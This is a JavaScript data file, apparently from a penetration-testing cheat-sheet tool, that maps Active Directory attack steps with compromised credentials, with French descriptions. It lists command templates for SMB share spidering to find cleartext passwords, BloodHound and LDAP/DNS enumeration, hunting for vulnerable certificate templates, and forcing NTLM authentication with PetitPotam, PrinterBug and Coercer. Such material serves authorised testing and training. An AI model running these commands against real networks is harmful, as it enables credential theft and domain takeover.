export const VALID_CREDENTIALS_DATA = [
  {
    name: 'Enumeration SMB & Shares',
    nodes: [
      { 
        label: 'NXC Spider Plus', 
        cmd: 'nxc smb <ip_range> -u <user> -p <password> -M spider_plus', 
        leadsTo: 'Sensitive Files',
        description: 'Parcourt récursivement les partages SMB pour indexer les fichiers et trouver des mots de passe en clair.'
      },
      { 
        label: 'NXC List Shares', 
        cmd: 'nxc smb <ip_range> -u <user> -p <password> --shares', 
        leadsTo: 'Share Access',
        description: 'Liste les partages disponibles et les droits d\'accès (READ, WRITE) avec le compte compromis.'
      },
      { 
        label: 'SMBMap', 
        cmd: 'smbmap -u <user> -p <password> -d <domain> -H <ip>', 
        leadsTo: 'Share Access',
        description: 'Outil alternatif pour lister les partages, les permissions et télécharger des fichiers.'
      }
    ]
  },
  {
    name: 'BloodHound & Cartography',
    nodes: [
      { 
        label: 'BloodHound Python (Legacy)', 
        cmd: 'bloodhound-python -d <domain> -u <user> -p <password> -gc <dc_ip> -c all', 
        leadsTo: 'Attack Path',
        description: 'Collecte les objets AD (utilisateurs, groupes, sessions, ACLs) pour identifier les chemins d\'attaque.'
      },
      { 
        label: 'SharpHound (C#)', 
        cmd: 'SharpHound.exe -c All -d <domain>', 
        leadsTo: 'Attack Path',
        description: 'Collecteur officiel (plus rapide et furtif) à exécuter depuis une machine Windows intégrée au domaine.'
      },
      { 
        label: 'RustHound', 
        cmd: 'rusthound -d <domain> -u <user> -p <password> -o ./output', 
        leadsTo: 'Attack Path',
        description: 'Alternative rapide écrite en Rust pour la collecte BloodHound.'
      }
    ]
  },
  {
    name: 'Enumeration LDAP & DNS',
    nodes: [
      { 
        label: 'LDAP Domain Dump', 
        cmd: 'ldapdomaindump -u <user> -p <password> -d <domain> <dc_ip>', 
        leadsTo: 'HTML Report',
        description: 'Génère un rapport HTML complet du domaine (utilisateurs, ordinateurs, groupes, politiques) via LDAP.'
      },
      { 
        label: 'ADI DNS Dump', 
        cmd: 'adidnsdump -u <domain>\\<user> -p <password> --print-zones <dc_ip>', 
        leadsTo: 'Hidden Hosts',
        description: 'Énumère tous les enregistrements DNS de la zone intégrée à l\'AD pour trouver des machines cachées.'
      }
    ]
  },
  {
    name: 'ADCS (Certificates)',
    nodes: [
      { 
        label: 'Certipy Find', 
        cmd: 'certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable', 
        leadsTo: 'ESC1-ESC11',
        description: 'Analyse les modèles de certificats (Templates) pour trouver des vulnérabilités d\'escalade de privilèges (ESC1, ESC8...).'
      },
      { 
        label: 'Certify (Windows)', 
        cmd: 'Certify.exe find /vulnerable', 
        leadsTo: 'ESC1-ESC11',
        description: 'Outil C# équivalent à Certipy pour l\'énumération des vulnérabilités ADCS depuis Windows.'
      }
    ]
  },
  {
    name: 'Automated Enum',
    nodes: [
      { 
        label: 'AdPEAS', 
        cmd: 'Import-Module .\\AdPEAS.ps1; Invoke-AdPEAS -Domain <domain>', 
        leadsTo: 'Full Report',
        description: 'Script PowerShell "Tout-en-un" pour l\'énumération automatique des vulnérabilités AD (inspiré de WinPEAS).'
      },
      { 
        label: 'PingCastle', 
        cmd: 'PingCastle.exe --healthcheck --server <domain>', 
        leadsTo: 'Risk Report',
        description: 'Outil d\'audit générant un rapport de score de sécurité et mettant en évidence les mauvaises configurations.'
      }
    ]
  },
  {
    name: 'Coercion (Authenticated)',
    nodes: [
      { 
        label: 'PetitPotam (Auth)', 
        cmd: 'python3 petitpotam.py -u <user> -p <password> -d <domain> <listener_ip> <target_ip>', 
        leadsTo: 'Machine Auth',
        description: 'Force une machine cible à s\'authentifier (NTLM) vers l\'attaquant via MS-EFSRPC (nécessite des crédentiels valides).'
      },
      { 
        label: 'PrinterBug (SpoolSample)', 
        cmd: 'python3 printerbug.py <domain>/<user>:<password>@<target_ip> <listener_ip>', 
        leadsTo: 'Machine Auth',
        description: 'Exploite le service Spooler d\'impression pour forcer une authentification machine.'
      },
      { 
        label: 'Coercer', 
        cmd: 'coercer coerce -u <user> -p <password> -d <domain> -l <listener_ip> -t <target_ip>', 
        leadsTo: 'Machine Auth',
        description: 'Outil complet testant automatiquement plusieurs méthodes de coercition (RPC, WebDAV, SMB).'
      }
    ]
  }
];